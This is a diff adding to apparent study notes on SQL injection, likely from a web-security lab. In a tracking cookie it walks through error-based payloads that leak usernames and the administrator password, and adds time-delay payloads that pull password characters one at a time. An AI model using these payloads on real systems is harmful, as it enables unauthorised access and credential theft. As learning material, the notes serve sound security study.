@@ -68,7 +68,25 @@
 >- and so on...
 ### verbose SQL error messages
 
+  - let's say the original value of the cookie is `TrackingId=xyz`.
+  >1) **Modify the cookie**: `TrackingId=xyz'` -> error message is received
+  >2) **comment out the rest of the query**: `TrackingId=ogAZZfxtOKUELbuJ'--` -> comments the extra single quote -> no longer error 
+  >3) **raise an error using `cast` keyword**: `TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--` -> error: `AND condition must be a boolean expression`
+  >4) **modify the condition accordingly (to recieve no error)**: `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--` -> no longer error
+  >5) **use `SELECT` to retrive usernames from database**: `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--` -> error: character limit 
+  >6) **Delete the original value of the cookie(to free up some additional characters)**: `TrackingId='...` -> error: unexpectedly returned more than one row  
+  >7) **Modify the query to return only one row**: `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` -> error leaks the first username: `ERROR: invalid input syntax for type integer: "administrator"`
+  >8) **leak password**: `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--` 
+## triggering time delays
 
+- simple example:
+  >`'; IF (1=2) WAITFOR DELAY '0:0:10'--` -> condition false => no delay
+  >`'; IF (1=1) WAITFOR DELAY '0:0:10'--` -> condition true => 10 sec delay
+  >=> **retrive data using one character at a time**: `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`
+
+/gitcomm
+- another example
+  >  
 # Subverting application logic
 
 ## simple attack 
